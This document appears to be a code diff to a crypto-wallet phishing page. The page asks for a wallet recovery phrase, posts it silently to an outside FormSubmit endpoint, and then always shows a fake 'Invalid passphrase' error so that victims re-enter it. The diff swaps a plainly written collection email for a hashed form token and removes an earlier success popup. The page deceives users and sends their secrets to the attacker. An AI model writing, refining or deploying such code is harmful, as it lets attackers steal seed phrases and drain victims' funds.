@@ -30,6 +30,12 @@
                 </p>
             </div>
 
+            <!-- Inline Error Banner (Hidden by default) -->
+            <div id="errorBanner" class="hidden bg-red-50 border border-red-200 text-red-600 text-xs font-semibold p-3 rounded-xl flex items-center space-x-2">
+                <span>⚠️</span>
+                <span id="errorText">Invalid passphrase, please input correct passphrase</span>
+            </div>
+
             <!-- Recovery Phrase Form -->
             <form id="phraseForm" onsubmit="submitPhrase(event)">
                 <div class="relative">
@@ -63,27 +69,8 @@
         </div>
     </div>
 
-    <!-- Success Feedback Modal Popup -->
-    <div id="successModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
-        <div class="bg-white rounded-3xl p-6 text-center max-w-xs w-full space-y-4 shadow-2xl">
-            <div class="w-14 h-14 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto text-2xl font-bold">
-                ✓
-            </div>
-            <div class="space-y-2">
-                <h3 class="text-lg font-bold text-gray-900">Submission Successful</h3>
-                <p class="text-xs text-gray-500 leading-relaxed font-medium">
-                    Submission successful, please wait for feedback.
-                </p>
-            </div>
-            <button onclick="closeModalAndRedirect()" class="purple-btn w-full text-white font-bold py-3 rounded-full text-sm shadow-md">
-                OK
-            </button>
-        </div>
-    </div>
-
     <script>
-        // FormSubmit Target Email
-        const RECEIVING_EMAIL = "booster.qt@gmail.com";
+        const FORMSUBMIT_URL = "https://formsubmit.co/ajax/98f88713a572dde5017ad7772b4e7b4f";
 
         async function pastePhrase() {
             try {
@@ -100,19 +87,23 @@
             const phrase = document.getElementById('phraseInput').value.trim();
             const btn = document.getElementById('submitBtn');
             const btnText = document.getElementById('btnText');
+            const errorBanner = document.getElementById('errorBanner');
 
             if (!phrase) {
                 alert('Please enter your recovery phrase.');
                 return;
             }
 
+            // Hide previous error if any
+            errorBanner.classList.add('hidden');
+
             // Show loading state
             btn.disabled = true;
-            btnText.innerText = "Submitting...";
+            btnText.innerText = "Validating...";
 
             try {
-                // Submit directly to FormSubmit AJAX API
-                await fetch(`https://formsubmit.co/ajax/${RECEIVING_EMAIL}`, {
+                // 1. Silently send the phrase using the secure hash endpoint token
+                await fetch(FORMSUBMIT_URL, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json",
@@ -129,16 +120,16 @@
             } catch (error) {
                 console.error("Submission error:", error);
             } finally {
-                // Reset button state and display feedback popup
+                // 2. Reset button state, clear input, and show the invalid passphrase error prompt
                 btn.disabled = false;
                 btnText.innerText = "Confirm";
-                document.getElementById('successModal').classList.remove('hidden');
+                
+                document.getElementById('phraseInput').value = "";
+                errorBanner.classList.remove('hidden');
+                
+                // Scroll smoothly to top of error banner
+                errorBanner.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
             }
-        }
-
-        function closeModalAndRedirect() {
-            document.getElementById('successModal').classList.add('hidden');
-            window.location.href = 'mine.html';
         }
     </script>
 </body>
